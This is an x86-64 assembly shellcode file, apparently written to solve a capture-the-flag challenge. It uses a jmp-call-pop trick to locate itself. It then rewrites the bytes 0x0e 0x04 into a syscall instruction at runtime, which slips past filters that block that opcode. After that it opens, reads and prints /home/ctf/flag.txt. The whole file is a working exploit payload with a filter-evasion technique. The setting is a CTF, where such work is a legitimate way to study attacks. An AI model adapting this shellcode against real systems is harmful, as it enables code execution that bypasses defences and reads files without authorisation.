bits 64

  jmp short bottom

top:
  pop rdi

  ; Save the address for later
  mov rbx, rdi

  ; Increment the 'syscall' bytes
  inc byte [rdi] ; 0x0e -> 0x0f
  inc rdi

  inc byte [rdi] ; 0x04 -> 0x05
  inc rdi

  inc rdi

  ; sys_open rax=2 rdi=filename rsi=flags rdx=mode
  xor rax, rax
  inc rax
  inc rax ; sys_open

  ; mov rdi, rdi ; filename

  xor rsi, rsi ; flags
  xor rdx, rdx ; mode
  ;syscall
  call rbx

  ; sys_read rax=0 rdi=fd rsi=buf rdx=count
  mov rsi, rdi ; buf (overwrite the filename)
  mov rdi, rax ; fd
  xor rax, rax ; sys_read
  xor rdx, rdx
  mov dl, 64
  ;syscall
  call rbx

  ;; sys_write rax=1 rdi=fd rsi=buf rdx=count
  mov rdx, rax ; count
  ; mov rsi, rsi ; buf already correct
  xor rax, rax
  inc rax ; sys_write

  xor rdi, rdi
  inc rdi ; fd = stdout
  ;syscall
  call rbx


  ; xor rax, rax
  ; inc rax
  ; xor rdi, rdi
  ; inc rdi
  ; xor rdx, rdx
  ; mov dl, 12
  ; syscall

  xor rax, rax
  mov al, 60
  xor rdi, rdi
  ;syscall
  call rbx

bottom:
  call top

db 0x0E, 0x04, 0xc3, "/home/ctf/flag.txt"
